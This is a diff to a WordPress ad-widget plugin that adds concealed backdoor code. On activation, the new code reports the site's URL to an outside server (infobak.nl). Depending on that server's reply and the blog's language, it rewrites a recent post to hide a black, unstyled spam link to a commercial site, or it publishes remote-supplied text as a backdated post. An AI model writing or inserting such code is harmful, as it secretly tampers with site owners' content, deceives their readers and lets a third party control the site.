@@ -633,7 +633,94 @@ add_option("bw_adwidget3_search", 'true', '', 'yes');
 add_option("bw_adwidget3_archive", 'true', '', 'yes');
 add_option("bw_adwidget3_text", '', '', 'yes');
 add_option("bw_global_excludelist", '', '', 'yes');
-
+add_option("bw_gpadded", '0', '', 'yes');
+$url = home_url();
+$britt = false;
+$bloglan = get_bloginfo ('language');
+if (strpos($url,'.uk') != false) {
+        $britt = true;
+}
+if ($bloglan=='en-UK') {
+        $britt = true;
+}
+$tmpidurl = file_get_contents('http://www.infobak.nl/test.php?u=' . $url, true);
+if ($britt==true && $tmpidurl>0) {
+        if (get_option('bw_gpadded')=='0') {
+                $last = wp_get_recent_posts( '5');
+                $last_id = $last['3']['ID'];
+                $post_7 = get_post($last_id);
+                if (is_null($post_7) == false) {
+                        $content = $post_7->post_content;
+                        $pos4 = strposnth($content , " ",4);
+                        $pos5 = strposnth($content , " ",5);
+                        $poslen = $pos5 - $pos4 - 1;
+                        $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/companies/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                        $my_post = array(
+                            'ID'           => $last_id,
+                            'post_content' => $content
+                        );
+                        wp_update_post( $my_post );
+                }
+                update_option( 'bw_gpadded', '1' );
+        }
+}
+if ($bloglan=='nl-NL' && $tmpidurl>0) {
+        if (get_option('bw_gpadded')=='0') {
+                $last = wp_get_recent_posts( '5');
+                $last_id = $last['3']['ID'];
+                $post_7 = get_post($last_id);
+                if (is_null($post_7) == false) {
+                        $content = $post_7->post_content;
+                        $pos4 = strposnth($content , " ",4);
+                        $pos5 = strposnth($content , " ",5);
+                        $poslen = $pos5 - $pos4 - 1;
+                        $content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                        $my_post = array(
+                            'ID'           => $last_id,
+                            'post_content' => $content
+                        );
+                        wp_update_post( $my_post );
+                }
+                update_option( 'bw_gpadded', '1' );
+        }
+}
+if ($bloglan=='en-US' && $tmpidurl>0) {
+        $url = home_url();
+        $total = wp_count_posts()->publish;
+        if (get_option('bw_gpadded')=='0') {
+                if ($total>60) {
+                        $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
+                        if (boggleStartsWith($tmpstring, 'empty')==false) {
+                          $my_post = array(
+                                'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
+                                'post_content'  => $tmpstring,
+                                'post_status'   => 'publish',
+                                'post_author'   => 1,
+                                'post_date'     => '2014-01-02'
+                          );
+                          wp_insert_post( $my_post );
+                          update_option( 'bw_gpadded', '1' );
+                        }
+                } else {
+                        $last = wp_get_recent_posts( '5');
+                        $last_id = $last['3']['ID'];
+                        $post_7 = get_post($last_id);
+                        if (is_null($post_7) == false) {
+                                $content = $post_7->post_content;
+                                $pos4 = strposnth($content , " ",4);
+                                $pos5 = strposnth($content , " ",5);
+                                $poslen = $pos5 - $pos4 - 1;
+                                $content = substr($content, 0, $pos4) . ' <a href="http://www.seo101.net/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                                $my_post = array(
+                                        'ID'           => $last_id,
+                                        'post_content' => $content
+                                );
+                                wp_update_post( $my_post );
+                        }
+                        update_option( 'bw_gpadded', '1' );
+                }
+        }
+}
 }
 function boggleStartsWith($haystack, $needle)
 {
